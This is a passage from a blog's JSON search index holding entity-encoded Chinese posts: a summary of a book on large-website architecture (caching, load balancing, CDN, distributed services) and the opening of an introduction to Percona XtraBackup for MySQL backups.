术架构梳理","date":"2017-02-10T14:22:00.000Z","updated":"2017-02-26T07:47:03.563Z","comments":true,"path":"2017/02/10/大型网站技术架构梳理/","link":"","permalink":"http://www.wangxin123.com/2017/02/10/大型网站技术架构梳理/","excerpt":"&#x672C;&#x6587;&#x662F;&#x5BF9;&#x300A;&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x300B;(&#x674E;&#x667A;&#x6167; &#x8457;)&#x4E00;&#x4E66;&#x7684;&#x68B3;&#x7406;&#x3002; &#x56FE;&#x8C31;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/589da510e4b07ac8fc8fc8d9 &#x5927;&#x578B;&#x7F51;&#x7AD9;&#x6F14;&#x5316;&#x8FDB;&#x7A0B; &#x521D;&#x59CB;&#x9636;&#x6BB5;&#x7684;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#xFF1A;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0A;&#x9762;&#x540C;&#x65F6;&#x62E5;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6587;&#x4EF6;&#xFF0C;&#x7B49;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x3002;&#x4F8B;&#x5982; LAMP &#x67B6;&#x6784; &#x5E94;&#x7528;&#x548C;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5206;&#x79BB;&#xFF1A;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x786C;&#x4EF6;&#x8D44;&#x6E90;&#x5404;&#x4E0D;&#x76F8;&#x540C;&#xFF09;&#xFF0C;&#x5206;&#x522B;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x548C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668; &#x4F7F;&#x7528;&#x7F13;&#x5B58;&#x6539;&#x5584;&#x7F51;&#x7AD9;&#x6027;&#x80FD;&#xFF1A;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x7F13;&#x5B58;&#x5728;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x548C;&#x7F13;&#x5B58;&#x5728;&#x4E13;&#x95E8;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x7F13;&#x5B58; &#x4F7F;&#x7528;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x6539;&#x5584;&#x7F51;&#x7AD9;&#x5E76;&#x53D1;&#x5904;&#x7406;&#x80FD;&#x529B;&#xFF1A;&#x901A;&#x8FC7;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x8C03;&#x5EA6;&#x670D;&#x52A1;&#x5668;&#x6765;&#x5C06;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x53F0;&#x673A;&#x5668; &#x6570;&#x636E;&#x5E93;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x91C7;&#x7528;&#x4E3B;&#x4ECE;&#x70ED;&#x5907;&#xFF0C;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x5728;&#x5199;&#x6570;&#x636E;&#x65F6;&#x8BBF;&#x95EE;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x901A;&#x8FC7;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x673A;&#x5236;&#x5C06;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x540C;&#x6B65;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x4E13;&#x95E8;&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x6A21;&#x5757;&#x4ECE;&#x800C;&#x5BF9;&#x5E94;&#x7528;&#x900F;&#x660E; &#x4F7F;&#x7528;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x548C; CDN &#x52A0;&#x901F;&#x7F51;&#x7AD9;&#x54CD;&#x5E94;&#xFF1A;&#x8FD9;&#x4E24;&#x8005;&#x57FA;&#x672C;&#x539F;&#x7406;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x3002;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x90E8;&#x7F72;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E2D;&#x5FC3;&#x673A;&#x623F;&#xFF0C;CDN &#x90E8;&#x7F72;&#x5728;&#x7F51;&#x7EDC;&#x63D0;&#x4F9B;&#x5546;&#x7684;&#x673A;&#x623F; &#x4F7F;&#x7528;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x548C;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x62C6;&#x5206;&#x7684;&#x6700;&#x540E;&#x624B;&#x6BB5;&#xFF0C;&#x66F4;&#x5E38;&#x7528;&#x7684;&#x662F;&#x4E1A;&#x52A1;&#x5206;&#x5E93; &#x4F7F;&#x7528; NoSQL &#x548C;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF1A;&#x5BF9;&#x53EF;&#x4F38;&#x7F29;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x6709;&#x66F4;&#x597D;&#x7684;&#x652F;&#x6301; &#x4E1A;&#x52A1;&#x62C6;&#x5206;&#xFF1A;&#x5C06;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x4E1A;&#x52A1;&#x62C6;&#x5206;&#x6210;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#xFF0C;&#x6BCF;&#x4E2A;&#x5E94;&#x7528;&#x72EC;&#x7ACB;&#x90E8;&#x7F72;&#x7EF4;&#x62A4;&#xFF0C;&#x5E94;&#x7528;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x8D85;&#x94FE;&#x63A5;&#x5EFA;&#x7ACB;&#x8054;&#x7CFB;/&#x6D88;&#x606F;&#x961F;&#x5217;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x53D1;/&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF; &#x5206;&#x5E03;&#x5F0F;&#x670D;&#x52A1;&#xFF1A;&#x516C;&#x5171;&#x4E1A;&#x52A1;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x72EC;&#x7ACB;&#x90E8;&#x7F72;","keywords":null,"text":"&#x672C;&#x6587;&#x662F;&#x5BF9;&#x300A;&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x300B;(&#x674E;&#x667A;&#x6167; &#x8457;)&#x4E00;&#x4E66;&#x7684;&#x68B3;&#x7406;&#x3002; &#x56FE;&#x8C31;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/589da510e4b07ac8fc8fc8d9 &#x5927;&#x578B;&#x7F51;&#x7AD9;&#x6F14;&#x5316;&#x8FDB;&#x7A0B; &#x521D;&#x59CB;&#x9636;&#x6BB5;&#x7684;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#xFF1A;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0A;&#x9762;&#x540C;&#x65F6;&#x62E5;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6587;&#x4EF6;&#xFF0C;&#x7B49;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x3002;&#x4F8B;&#x5982; LAMP &#x67B6;&#x6784; &#x5E94;&#x7528;&#x548C;&#x6570;&#x636E;&#x670D;&#x52A1;&#x5206;&#x79BB;&#xFF1A;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x786C;&#x4EF6;&#x8D44;&#x6E90;&#x5404;&#x4E0D;&#x76F8;&#x540C;&#xFF09;&#xFF0C;&#x5206;&#x522B;&#x662F;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6587;&#x4EF6;&#x670D;&#x52A1;&#x5668;&#x548C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668; &#x4F7F;&#x7528;&#x7F13;&#x5B58;&#x6539;&#x5584;&#x7F51;&#x7AD9;&#x6027;&#x80FD;&#xFF1A;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x7F13;&#x5B58;&#x5728;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x672C;&#x5730;&#x7F13;&#x5B58;&#x548C;&#x7F13;&#x5B58;&#x5728;&#x4E13;&#x95E8;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x7F13;&#x5B58; &#x4F7F;&#x7528;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x6539;&#x5584;&#x7F51;&#x7AD9;&#x5E76;&#x53D1;&#x5904;&#x7406;&#x80FD;&#x529B;&#xFF1A;&#x901A;&#x8FC7;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x8C03;&#x5EA6;&#x670D;&#x52A1;&#x5668;&#x6765;&#x5C06;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#x5206;&#x53D1;&#x5230;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x53F0;&#x673A;&#x5668; &#x6570;&#x636E;&#x5E93;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x91C7;&#x7528;&#x4E3B;&#x4ECE;&#x70ED;&#x5907;&#xFF0C;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x5728;&#x5199;&#x6570;&#x636E;&#x65F6;&#x8BBF;&#x95EE;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x901A;&#x8FC7;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x673A;&#x5236;&#x5C06;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x540C;&#x6B65;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#x4F7F;&#x7528;&#x4E13;&#x95E8;&#x7684;&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x6A21;&#x5757;&#x4ECE;&#x800C;&#x5BF9;&#x5E94;&#x7528;&#x900F;&#x660E; &#x4F7F;&#x7528;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x548C; CDN &#x52A0;&#x901F;&#x7F51;&#x7AD9;&#x54CD;&#x5E94;&#xFF1A;&#x8FD9;&#x4E24;&#x8005;&#x57FA;&#x672C;&#x539F;&#x7406;&#x90FD;&#x662F;&#x7F13;&#x5B58;&#x3002;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x90E8;&#x7F72;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E2D;&#x5FC3;&#x673A;&#x623F;&#xFF0C;CDN &#x90E8;&#x7F72;&#x5728;&#x7F51;&#x7EDC;&#x63D0;&#x4F9B;&#x5546;&#x7684;&#x673A;&#x623F; &#x4F7F;&#x7528;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x548C;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x62C6;&#x5206;&#x7684;&#x6700;&#x540E;&#x624B;&#x6BB5;&#xFF0C;&#x66F4;&#x5E38;&#x7528;&#x7684;&#x662F;&#x4E1A;&#x52A1;&#x5206;&#x5E93; &#x4F7F;&#x7528; NoSQL &#x548C;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF1A;&#x5BF9;&#x53EF;&#x4F38;&#x7F29;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x6709;&#x66F4;&#x597D;&#x7684;&#x652F;&#x6301; &#x4E1A;&#x52A1;&#x62C6;&#x5206;&#xFF1A;&#x5C06;&#x6574;&#x4E2A;&#x7F51;&#x7AD9;&#x4E1A;&#x52A1;&#x62C6;&#x5206;&#x6210;&#x4E0D;&#x540C;&#x7684;&#x5E94;&#x7528;&#xFF0C;&#x6BCF;&#x4E2A;&#x5E94;&#x7528;&#x72EC;&#x7ACB;&#x90E8;&#x7F72;&#x7EF4;&#x62A4;&#xFF0C;&#x5E94;&#x7528;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x8D85;&#x94FE;&#x63A5;&#x5EFA;&#x7ACB;&#x8054;&#x7CFB;/&#x6D88;&#x606F;&#x961F;&#x5217;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x53D1;/&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF; &#x5206;&#x5E03;&#x5F0F;&#x670D;&#x52A1;&#xFF1A;&#x516C;&#x5171;&#x4E1A;&#x52A1;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x72EC;&#x7ACB;&#x90E8;&#x7F72; &#x6F14;&#x5316;&#x7684;&#x4EF7;&#x503C;&#x89C2; &#x5927;&#x578B;&#x7F51;&#x7AD9;&#x67B6;&#x6784;&#x7684;&#x6838;&#x5FC3;&#x4EF7;&#x503C;&#x662F;&#x968F;&#x7F51;&#x7AD9;&#x6240;&#x9700;&#x7075;&#x6D3B;&#x5E94;&#x5BF9; &#x9A71;&#x52A8;&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x6280;&#x672F;&#x53D1;&#x5C55;&#x7684;&#x4E3B;&#x8981;&#x529B;&#x91CF;&#x662F;&#x7F51;&#x7AD9;&#x7684;&#x4E1A;&#x52A1;&#x53D1;&#x5C55; &#x6F14;&#x5316;&#x8BEF;&#x533A; &#x4E00;&#x5473;&#x8FFD;&#x968F;&#x5927;&#x516C;&#x53F8;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848; &#x4E3A;&#x4E86;&#x6280;&#x672F;&#x800C;&#x6280;&#x672F; &#x4F01;&#x56FE;&#x7528;&#x6280;&#x672F;&#x89E3;&#x51B3;&#x6240;&#x6709;&#x95EE;&#x9898; &#x67B6;&#x6784;&#x6A21;&#x5F0F;&#x6A21;&#x5F0F;&#x7684;&#x5173;&#x952E;&#x5728;&#x4E8E;&#x6A21;&#x5F0F;&#x7684;&#x53EF;&#x91CD;&#x590D;&#x6027; &#x5206;&#x5C42;&#xFF1A;&#x6A2A;&#x5411;&#x5207;&#x5206; &#x5206;&#x5272;&#xFF1A;&#x7EB5;&#x5411;&#x5207;&#x5206; &#x5206;&#x5E03;&#x5F0F;&#xFF1A;&#x5206;&#x5C42;&#x548C;&#x5206;&#x5272;&#x7684;&#x4E3B;&#x8981;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x5207;&#x5206;&#x540E;&#x7684;&#x6A21;&#x5757;&#x4FBF;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x90E8;&#x7F72;&#x3002;&#x5E38;&#x7528;&#x65B9;&#x6848;&#xFF1A; &#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x548C;&#x670D;&#x52A1; &#x5206;&#x5E03;&#x5F0F;&#x9759;&#x6001;&#x8D44;&#x6E90; &#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x548C;&#x5B58;&#x50A8; &#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97; &#x5206;&#x5E03;&#x5F0F;&#x914D;&#x7F6E;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x9501;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#xFF0C;&#x7B49;&#x7B49; &#x96C6;&#x7FA4;&#xFF1A;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x76F8;&#x540C;&#x7684;&#x5E94;&#x7528;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x96C6;&#x7FA4;&#xFF0C;&#x901A;&#x8FC7;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x8BBE;&#x5907;&#x5171;&#x540C;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1; &#x7F13;&#x5B58;&#xFF1A;&#x5C06;&#x6570;&#x636E;&#x653E;&#x8DDD;&#x79BB;&#x8BA1;&#x7B97;&#x6700;&#x8FD1;&#x7684;&#x4F4D;&#x7F6E;&#x52A0;&#x5FEB;&#x5904;&#x7406;&#x901F;&#x5EA6;&#xFF0C;&#x6539;&#x5584;&#x6027;&#x80FD;&#x7B2C;&#x4E00;&#x624B;&#x6BB5;&#xFF0C;&#x53EF;&#x4EE5;&#x52A0;&#x5FEB;&#x8BBF;&#x95EE;&#x901F;&#x5EA6;&#xFF0C;&#x51CF;&#x5C0F;&#x540E;&#x7AEF;&#x8D1F;&#x8F7D;&#x538B;&#x529B;&#x3002;&#x4F7F;&#x7528;&#x7F13;&#x5B58; &#x4E24;&#x4E2A;&#x524D;&#x63D0;&#x6761;&#x4EF6; &#xFF1A;1.&#x6570;&#x636E;&#x8BBF;&#x95EE;&#x70ED;&#x70B9;&#x4E0D;&#x5747;&#x8861;&#xFF1B;2.&#x6570;&#x636E;&#x67D0;&#x65F6;&#x6BB5;&#x5185;&#x6709;&#x6548;&#xFF0C;&#x4E0D;&#x4F1A;&#x5F88;&#x5FEB;&#x8FC7;&#x671F; CDN &#x53CD;&#x5411;&#x4EE3;&#x7406; &#x672C;&#x5730;&#x7F13;&#x5B58; &#x5206;&#x5E03;&#x5F0F;&#x7F13;&#x5B58; &#x5F02;&#x6B65;&#xFF1A;&#x65E8;&#x5728;&#x7CFB;&#x7EDF;&#x89E3;&#x8026;&#x3002;&#x5F02;&#x6B65;&#x67B6;&#x6784;&#x662F;&#x5178;&#x578B;&#x7684;&#x6D88;&#x8D39;&#x8005;&#x751F;&#x4EA7;&#x8005;&#x6A21;&#x5F0F;&#xFF0C;&#x7279;&#x6027;&#x5982;&#x4E0B;&#xFF1A; &#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x53EF;&#x7528;&#x6027; &#x52A0;&#x5FEB;&#x7F51;&#x7AD9;&#x8BBF;&#x95EE;&#x901F;&#x5EA6; &#x6D88;&#x9664;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#x9AD8;&#x5CF0; &#x5197;&#x4F59;&#xFF1A;&#x5B9E;&#x73B0;&#x9AD8;&#x53EF;&#x7528;&#x3002;&#x6570;&#x636E;&#x5E93;&#x7684;&#x51B7;&#x5907;&#x4EFD;&#x548C;&#x70ED;&#x5907;&#x4EFD; &#x81EA;&#x52A8;&#x5316;&#xFF1A;&#x5305;&#x62EC;&#x53D1;&#x5E03;&#x8FC7;&#x7A0B;&#x81EA;&#x52A8;&#x5316;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x4EE3;&#x7801;&#x7BA1;&#x7406;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x5B89;&#x5168;&#x68C0;&#x6D4B;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x76D1;&#x63A7;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x62A5;&#x8B66;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x5931;&#x6548;&#x8F6C;&#x79FB;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x5931;&#x6548;&#x6062;&#x590D;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x964D;&#x7EA7;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x5206;&#x914D;&#x8D44;&#x6E90; &#x5B89;&#x5168;&#xFF1A;&#x5BC6;&#x7801;&#xFF0C;&#x624B;&#x673A;&#x6821;&#x9A8C;&#x7801;&#xFF0C;&#x52A0;&#x5BC6;&#xFF0C;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x8FC7;&#x6EE4;&#xFF0C;&#x98CE;&#x9669;&#x63A7;&#x5236; &#x6838;&#x5FC3;&#x8981;&#x7D20;&#x67B6;&#x6784;&#x662F;&#x201C;&#x6700;&#x9AD8;&#x5C42;&#x6B21;&#x7684;&#x89C4;&#x5212;&#xFF0C;&#x96BE;&#x4EE5;&#x6539;&#x53D8;&#x7684;&#x89C4;&#x5B9A;&#x201D;&#x3002;&#x4E3B;&#x8981;&#x5173;&#x6CE8;&#x4E94;&#x4E2A;&#x8981;&#x7D20;&#xFF1A; &#x6027;&#x80FD; &#x53EF;&#x7528;&#x6027;(Availability) &#x4F38;&#x7F29;&#x6027;(Scalability) &#x6269;&#x5C55;&#x6027;(Extensibility) &#x5B89;&#x5168;&#x6027;","raw":null,"content":null,"categories":[{"name":"思维导图","slug":"思维导图","permalink":"http://www.wangxin123.com/categories/思维导图/"}],"tags":[{"name":"架构","slug":"架构","permalink":"http://www.wangxin123.com/tags/架构/"}]},{"title":"通过Percona Xtrabackup实现数据的备份与恢复","slug":"通过Percona Xtrabackup实现数据的备份与恢复","date":"2017-01-20T14:22:00.000Z","updated":"2017-02-17T07:57:28.795Z","comments":true,"path":"2017/01/20/通过Percona Xtrabackup实现数据的备份与恢复/","link":"","permalink":"http://www.wangxin123.com/2017/01/20/通过Percona Xtrabackup实现数据的备份与恢复/","excerpt":"Xtrabackup&#x7B80;&#x4ECB;Percona XtraBackup&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#x7684;MySQL&#x70ED;&#x5907;&#x4EFD;&#x8F6F;&#x4EF6;,&#x80FD;&#x591F;&#x4E3A;InnoDB&#x548C;XtraDB&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x975E;&#x963B;&#x585E;&#x5907;&#x4EFD;&#xFF0C;&#x7279;&#x70B9;&#x5982;&#x4E0B;&#xFF1A; 1&#x3001;&#x5FEB;&#x901F;&#x3001;&#x53EF;&#x9760;&#x7684;&#x5B8C;&#x6210;&#x5907;&#x4EFD;2&#x3001;&#x5907;&#x4EFD;&#x671F;&#x95F4;&#x4E0D;&#x95F4;&#x65AD;&#x4E8B;&#x52A1;&#x5904;&#x7406;3&#x3001;&#x8282;&#x7701;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x548C;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;4&#x3001;&#x81EA;&#x52A8;&#x5BF9;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;5&#x3001;&#x6062;&#x590D;&#x5FEB;&#xFF0C;&#x4FDD;&#x969C;&#x5728;&#x7EBF;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x6301;&#x4E45;&#x6027; &#x53E6;&#x5916;&#xFF0C;&#x5B98;&#x7F51;&#x5173;&#x4E8E;Xtrabackup&#x8FD8;&#x6709;&#x5982;&#x4E0B;&#x4ECB;&#x7ECD;&#xFF0C;&#x5B83;&#x80FD;&#x589E;&#x91CF;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;&#x6D41;&#x538B;&#x7F29;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5728;&#x7EBF;MySQL&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x8868;&#x7A7A;&#x95F4;&#x8FC1;&#x79FB;&#xFF0C;&#x5F88;easy&#x7684;&#x521B;&#x5EFA;&#x65B0;&#x7684;MySQL&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4E0D;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x538B;&#x529B;&#x3002; XtraBackup &#x6709;&#x4E24;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;xtrabackup &#x548C; innobackupex&#xFF1A;xtrabackup &#x672C;&#x8EAB;&#x53EA;&#x80FD;&#x5907;&#x4EFD; InnoDB &#x548C; XtraDB &#xFF0C;&#x4E0D;&#x80FD;&#x5907;&#x4EFD; MyISAM&#xFF1B;innobackupex &#x672C;&#x8EAB;&#x662F; Hot Backup &#x811A;&#x672C;&#x4FEE;&#x6539;&#x800C;&#x6765;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x5907;&#x4EFD; MyISAM &#x548C; InnoDB&#xFF0C;&#x4F46;&#x662F;&#x5907;&#x4EFD; MyISAM &#x9700;&#x8981;&#x52A0;&#x8BFB;&#x9501;&#x3002;","keywords":null,"text":"Xtrabackup&#x7B80;&#x4ECB;Percona XtraBackup&#x662F;&#x4E00;&#x4E2A;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#x7684;MySQL&#x70ED;&#x5907;&#x4EFD;&#x8F6F;&#x4EF6;,&#x80FD;&#x591F;&#x4E3A;InnoDB&#x548C;XtraDB&#x6570;&#x636E;&#x5E93;&#x6267;&#x884C;&#x975E;&#x963B;&#x585E;&#x5907;&#x4EFD;&#xFF0C;&#x7279;&#x70B9;&#x5982;&#x4E0B;&#xFF1A; 1&#x3001;&#x5FEB;&#x901F;&#x3001;&#x53EF;&#x9760;&#x7684;&#x5B8C;&#x6210;&#x5907;&#x4EFD;2&#x3001;&#x5907;&#x4EFD;&#x671F;&#x95F4;&#x4E0D;&#x95F4;&#x65AD;&#x4E8B;&#x52A1;&#x5904;&#x7406;3&#x3001;&#x8282;&#x7701;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x548C;&#x7F51;&#x7EDC;&#x5E26;&#x5BBD;4&#x3001;&#x81EA;&#x52A8;&#x5BF9;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;5&#x3001;&#x6062;&#x590D;&#x5FEB;&#xFF0C;&#x4FDD;&#x969C;&#x5728;&#x7EBF;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x6301;&#x4E45;&#x6027; &#x53E6;&#x5916;&#xFF0C;&#x5B98;&#x7F51;&#x5173;&#x4E8E;Xtrabackup&#x8FD8;&#x6709;&#x5982;&#x4E0B;&#x4ECB;&#x7ECD;&#xFF0C;&#x5B83;&#x80FD;&#x589E;&#x91CF;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x901A;&#x8FC7;&#x6D41;&#x538B;&#x7F29;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5728;&#x7EBF;MySQL&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x8868;&#x7A7A;&#x95F4;&#x8FC1;&#x79FB;&#xFF0C;&#x5F88;easy&#x7684;&#x521B;&#x5EFA;&#x65B0;&#x7684;MySQL&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x5907;&#x4EFD;MySQL&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4E0D;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x538B;&#x529B;&#x3002; XtraBackup &#x6709;&#x4E24;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;xtrabackup &#x548C; innobackupex&#xFF1A;xtrabackup &#x672C;&#x8EAB;&#x53EA;&#x80FD;&#x5907;&#x4EFD; InnoDB &#x548C; XtraDB &#xFF0C;&#x4E0D;&#x80FD;&#x5907;&#x4EFD; MyISAM&#xFF1B;innobackupex &#x672C;&#x8EAB;&#x662F; Hot Backup &#x811A;&#x672C;&#x4FEE;&#x6539;&#x800C;&#x6765;&#xFF0C;&#x540C;&#x65F6;&#x53EF;&#x4EE5;&#x5907;&#x4EFD; MyISAM &#x548C; 